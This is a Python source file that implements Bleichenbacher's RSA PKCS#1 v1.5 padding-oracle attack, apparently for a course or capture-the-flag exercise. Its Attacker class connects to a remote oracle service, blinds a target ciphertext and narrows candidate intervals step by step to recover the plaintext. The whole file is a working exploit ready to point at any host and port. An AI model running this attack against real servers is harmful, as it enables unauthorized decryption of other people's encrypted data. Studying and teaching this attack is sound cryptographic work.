from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from math import ceil, floor
from attack.oracle import oracle, init_oracle, KEY_SIZE, ServerClosed
from attack.disjoint_segments import DisjointSegments
from random import randint
from icecream import ic
from socket import SHUT_RDWR


def ceil_div(x: int, y: int) -> int:
    return (x + y - 1) // y


class Attacker:

    def __init__(
        self,
        N: int,
        E: int,
        ct: int,
        host: str,
        port: int,
        random_blinding: bool = False,
        iteration: int = 1,
    ) -> None:
        self.N = N
        self.E = E
        self.ct = ct
        self.C = ct
        self.host = host
        self.port = port
        self.conn = init_oracle(host, port)
        self.K = len(long_to_bytes(N))
        self.B = pow(
            2, 8 * (self.K - 2)
        )  # the value of the lsb in the second most significant byte of N
        self.random_blinding = random_blinding
        self.s_list: list[int] = []
        self.M: DisjointSegments = DisjointSegments(
            [range(2 * self.B, 3 * self.B)]
        )  # ! dangerous
        self.iteration = iteration

    def oracle(self, num: int) -> bool:
        return oracle(num, self.conn)

    # & maybe for them to do
    def s_oracle(self, s: int) -> bool:
        return self.oracle(self.C * pow(s, self.E, self.N) % self.N)

    # & maybe for them to do
    def blinding(self) -> tuple[int, int]:
        for i in range(1, self.N):
            s0 = randint(1, self.N - 1) if self.random_blinding else i
            self.C = self.ct * pow(s0, self.E, self.N) % self.N
            if self.oracle(self.C):
                self.s0 = s0
                self.s_list.append(s0)
                return self.C, s0

    def find_next_conforming(self, start: int) -> int:
        ctr = 0
        for s in range(start, self.N):
            ctr += 1
            if self.s_oracle(s):
                return s
            if ctr % 10_000 == 0:
                ic(ctr)

    def search_start(self) -> int:
        s1 = self.find_next_conforming(self.N // (3 * self.B) + 1)
        self.s_list.append(s1)
        return s1

    def search_mulitiple_intervals(self) -> int:
        """
        This function is used to search for the next s_i in the case where there are multiple intervals in M.
        """
        s_i = self.find_next_conforming(self.s_list[-1] + 1)
        self.s_list.append(s_i)
        return s_i

    def search_single_interval(self, interval: range):
        """
        This function is used to search for the next s_i in the case where there is only one interval in M.
        """
        a, b = interval.start, interval.stop - 1
        for r_i in range(
            2 * ceil_div(b * self.s_list[-1] - 2 * self.B, self.N), self.N
        ):
            s_i = ceil_div(2 * self.B + r_i * self.N, b)
            if s_i * a < (3 * self.B + r_i * self.N):
                if self.s_oracle(s_i):
                    self.s_list.append(s_i)
                    return s_i

        raise ValueError("the range of r search need to be bigger")

    def search(self):
        """
        This function is used to search for the next s_i.
        """
        if self.iteration == 1:
            # step 2.a
            self.search_start()

        elif len(self.M) > 1:
            # step 2.b
            self.search_mulitiple_intervals()
        else:
            assert len(self.M) == 1
            # step 2.c
            self.search_single_interval(list(self.M)[0])

    def update_intervals(self, s_i: int) -> DisjointSegments:
        """
        This function is used to update the intervals in M after finding the next s_i.
        """
        M_res = DisjointSegments()
        for interval in self.M:
            a, b = interval.start, interval.stop - 1
            r_range = range(
                ((a * s_i - 3 * self.B + 1) // self.N),
                ((b * s_i - 2 * self.B) // self.N) + 1,
            )
            for r in r_range:
                pos_sol_range = range(
                    max(a, ceil_div(2 * self.B + r * self.N, s_i)),
                    (min(b, (((3 * self.B - 1 + r * self.N) // s_i))) + 1),
                )

                M_res.add(pos_sol_range)

        if not (len(M_res) >= 1):
            return self.M
            # raise AssertionError
        self.M = M_res
        return M_res

    def algo_iteration(self):
        """
        This function is used to run one iteration of the attack algorithm.
        """
        try:
            # step 2
            self.search()

            # step 3
            self.update_intervals(self.s_list[-1])
            if self.iteration <= 5 or self.iteration % 50 == 0:
                ic(self.iteration)
                ic(self.M.size())

            # step 4
            if len(self.M) == 1:
                M_lst: list[range] = list(iter(self.M))
                if M_lst[0].stop - M_lst[0].start <= 1:
                    # answer = M_lst[0].start * pow(self.s_list[0], -1, self.N) % self.N
                    return True, M_lst[0]  # found solution

            return False, self.M

        except ServerClosed:
            return True, self.M.smallest_inclusive()  # ran out of time

    def attack(self) -> tuple[range, int]:
        ic("started attack")
        self.blinding()
        ic("did blinding")
        while True:
            res, ans = self.algo_iteration()
            if res:
                assert isinstance(ans, range)

                # result = ans
                # ans_num = result * pow(self.s0, -1, self.N) % self.N
                # ans = long_to_bytes(ans_num, KEY_SIZE // 8)
                # print(f"{ans = }")
                self.conn.shutdown(SHUT_RDWR)
                self.conn.close()
                return ans, self.s0
            self.iteration += 1
